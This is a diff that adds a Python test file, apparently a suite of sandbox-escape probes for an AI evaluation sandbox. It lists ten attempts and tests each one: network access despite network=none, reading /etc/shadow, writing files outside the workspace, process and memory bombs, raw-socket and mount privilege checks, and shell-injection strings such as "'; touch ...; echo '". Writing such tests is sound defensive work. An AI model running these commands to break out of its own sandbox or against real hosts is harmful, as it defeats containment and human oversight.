@@ -1,0 +1,98 @@
+
+
+diff --git a/Users/fole/Desktop/eval-break-sandbox-mimo-2026-05-14/exploit.py b/Users/fole/Desktop/eval-break-sandbox-mimo-2026-05-14/exploit.py
+new file mode 100644
+index 0000000..e61f8af
+--- /dev/null
++++ b/Users/fole/Desktop/eval-break-sandbox-mimo-2026-05-14/exploit.py
+@@ -0,0 +1,90 @@
++EXPLOITS = [
++    ("test_escape_network__dns", "network",
++     "resolve a public hostname despite network=none"),
++    ("test_escape_network__outbound_http", "network",
++     "fetch a URL despite network=none"),
++    ("test_escape_fs__read_host_etc", "fs",
++     "read /etc/shadow which is host-only"),
++    ("test_escape_fs__write_outside_workspace", "fs",
++     "write a sentinel file to /tmp on the host"),
++    ("test_escape_resource__pid_bomb", "resource",
++     "exceed pids-limit via fork bomb"),
++    ("test_escape_resource__mem_bomb", "resource",
++     "exceed memory limit via allocation"),
++    ("test_escape_privesc__net_raw", "privesc",
++     "use NET_RAW capability (ping) despite cap-drop=ALL"),
++    ("test_escape_privesc__mount", "privesc",
++     "mount a filesystem despite cap-drop=ALL"),
++    ("test_escape_shellinj__host_touch", "shellinj",
++     "create a host sentinel via shell injection"),
++    ("test_escape_shellinj__host_echo", "shellinj",
++     "write host file via shell metachar injection"),
++]
++
++
++def test_escape_network__dns(sandbox):
++    out = sandbox.sandbox_run("getent hosts example.com", timeout=10)
++    assert "exit=0" in out
++
++
++def test_escape_network__outbound_http(sandbox):
++    out = sandbox.sandbox_run(
++        "python3 -c \"import urllib.request; urllib.request.urlopen('http://example.com')\" 2>&1 || true",
++        timeout=10,
++    )
++    assert "exit=0" not in out or "urlopen" not in out
++
++
++def test_escape_fs__read_host_etc(sandbox):
++    out = sandbox.sandbox_run("cat /etc/shadow 2>&1", timeout=10)
++    assert "root:" in out and "exit=0" in out
++
++
++def test_escape_fs__write_outside_workspace(sandbox, tmp_path):
++    sentinel = tmp_path / "host_pwned"
++    out = sandbox.sandbox_run(
++        f"touch {sentinel} && echo 'escaped' && exit 0", timeout=10
++    )
++    assert sentinel.exists()
++
++
++def test_escape_resource__pid_bomb(sandbox):
++    out = sandbox.sandbox_run(
++        "for i in $(seq 1 1000); do : & done; wait; echo done", timeout=10
++    )
++    assert "exit=0" in out and "done" in out
++
++
++def test_escape_resource__mem_bomb(sandbox):
++    out = sandbox.sandbox_run(
++        "python3 -c \"x='a'*10**9; print('ok')\" 2>&1 || true", timeout=10
++    )
++    assert "ok" in out and "exit=0" in out
++
++
++def test_escape_privesc__net_raw(sandbox):
++    out = sandbox.sandbox_run(
++        "ping -c 1 127.0.0.1 2>&1 || true", timeout=10
++    )
++    assert "1 packets transmitted" in out and "received" in out
++
++
++def test_escape_privesc__mount(sandbox):
++    out = sandbox.sandbox_run(
++        "mount -t tmpfs none /mnt 2>&1 && echo MOUNT_OK || true", timeout=10
++    )
++    assert "MOUNT_OK" in out
++
++
++def test_escape_shellinj__host_touch(sandbox, tmp_path):
++    sentinel = tmp_path / "injected"
++    sandbox.sandbox_run(f"'; touch {sentinel}; echo '", timeout=10)
++    assert sentinel.exists()
++
++
++def test_escape_shellinj__host_echo(sandbox, tmp_path):
++    sentinel = tmp_path / "echo_injected"
++    sandbox.sandbox_run(
++        f'"; echo pwned > {sentinel}; echo "', timeout=10
++    )
++    assert sentinel.exists() and sentinel.read_text().strip() == "pwned"
